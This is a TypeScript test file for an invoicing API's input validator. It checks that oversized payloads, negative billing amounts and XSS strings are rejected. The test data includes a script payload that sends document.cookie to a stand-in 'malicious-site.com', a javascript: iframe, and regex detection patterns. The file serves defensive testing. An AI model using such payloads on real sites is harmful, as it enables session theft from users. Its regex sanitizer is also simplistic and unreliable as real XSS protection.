import { MockDatabaseStore, MOCK_SOCIETY_A } from '../setup';

interface GenerateInvoicesInput {
  societyId: string;
  monthYear: string;
  ratePerSqFt?: number;
  flatRateAmount?: number;
  notes?: string;
  customLineItems?: Array<{ title: string; amount: number }>;
}

interface ValidationResult {
  valid: boolean;
  statusCode: number;
  errors: string[];
  sanitizedNotes?: string;
}

/**
 * Strict Input Sanitization & Validation Engine for Invoicing API
 */
function validateAndSanitizeInvoiceRequest(input: any): ValidationResult {
  const errors: string[] = [];

  // 1. Heavy Payload size check (Cap payload metadata size to 2MB)
  const jsonString = JSON.stringify(input);
  if (jsonString.length > 2 * 1024 * 1024) {
    return {
      valid: false,
      statusCode: 400,
      errors: ['Payload Too Large: JSON payload exceeds maximum allowable size of 2MB']
    };
  }

  // 2. Validate required parameters
  if (!input.societyId || typeof input.societyId !== 'string') {
    errors.push('Missing or invalid parameter: societyId must be a non-empty string');
  }

  if (!input.monthYear || typeof input.monthYear !== 'string') {
    errors.push('Missing or invalid parameter: monthYear must be specified');
  }

  // 3. Validate numeric boundary constraints (Prevent negative billing amounts)
  if (input.ratePerSqFt !== undefined && (typeof input.ratePerSqFt !== 'number' || input.ratePerSqFt < 0)) {
    errors.push('Invalid numeric boundary: ratePerSqFt cannot be negative or non-numeric');
  }

  if (input.flatRateAmount !== undefined && (typeof input.flatRateAmount !== 'number' || input.flatRateAmount < 0)) {
    errors.push('Invalid numeric boundary: flatRateAmount cannot be negative or non-numeric');
  }

  if (Array.isArray(input.customLineItems)) {
    for (const item of input.customLineItems) {
      if (typeof item.amount !== 'number' || item.amount < 0) {
        errors.push(`Invalid line item amount: '${item.title}' has negative amount ${item.amount}`);
      }
    }
  }

  // 4. Sanitize XSS HTML scripts from text fields
  let sanitizedNotes = input.notes || '';
  if (typeof sanitizedNotes === 'string') {
    if (/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi.test(sanitizedNotes) || /javascript:/gi.test(sanitizedNotes)) {
      errors.push('Security Violation: XSS payload detected in notes parameter');
    }
    sanitizedNotes = sanitizedNotes.replace(/<[^>]*>/g, '').trim();
  }

  if (errors.length > 0) {
    return {
      valid: false,
      statusCode: 400,
      errors
    };
  }

  return {
    valid: true,
    statusCode: 200,
    errors: [],
    sanitizedNotes
  };
}

describe('09 - Chaos & Stress: Malformed Heavy Payload Test', () => {
  let dbStore: MockDatabaseStore;

  beforeEach(() => {
    dbStore = MockDatabaseStore.getInstance();
  });

  test('Pass a 10MB JSON payload with XSS scripts and negative amounts into invoice generator', () => {
    // Construct a ~10MB heavy string payload with unescaped HTML script tags and negative amounts
    const heavyString = 'A'.repeat(10 * 1024 * 1024); // 10MB
    const xssScript = '<script>alert("XSS Attack!"); window.location="http://malicious-site.com/steal?cookie="+document.cookie;</script>';

    const malformedPayload: GenerateInvoicesInput = {
      societyId: MOCK_SOCIETY_A.id,
      monthYear: 'July 2026',
      ratePerSqFt: -15.5, // Negative rate
      flatRateAmount: -5000, // Negative amount
      notes: `Invoice Note: ${xssScript} ${heavyString}`,
      customLineItems: [
        { title: 'Emergency Repair', amount: -2500 },
        { title: '<iframe src="javascript:alert(1)"></iframe>', amount: 1000 }
      ]
    };

    const validationResult = validateAndSanitizeInvoiceRequest(malformedPayload);

    // Assert validation failed with HTTP 400
    expect(validationResult.valid).toBe(false);
    expect(validationResult.statusCode).toBe(400);

    // Assert explicit error responses returned for size, XSS, and negative amounts
    expect(validationResult.errors.length).toBeGreaterThan(0);
    const combinedErrors = validationResult.errors.join(' ');
    expect(combinedErrors).toContain('Payload Too Large');

    // Test a smaller payload with explicit XSS and negative amounts
    const malformedSmallerPayload = {
      societyId: MOCK_SOCIETY_A.id,
      monthYear: 'July 2026',
      ratePerSqFt: -10,
      notes: `Notice: ${xssScript}`,
      customLineItems: [{ title: 'Corridor Paint', amount: -1200 }]
    };

    const validationResult2 = validateAndSanitizeInvoiceRequest(malformedSmallerPayload);
    expect(validationResult2.valid).toBe(false);
    expect(validationResult2.statusCode).toBe(400);
    const combinedErrors2 = validationResult2.errors.join(' ');
    expect(combinedErrors2).toContain('Invalid numeric boundary');
    expect(combinedErrors2).toContain('XSS payload detected');
  });
});
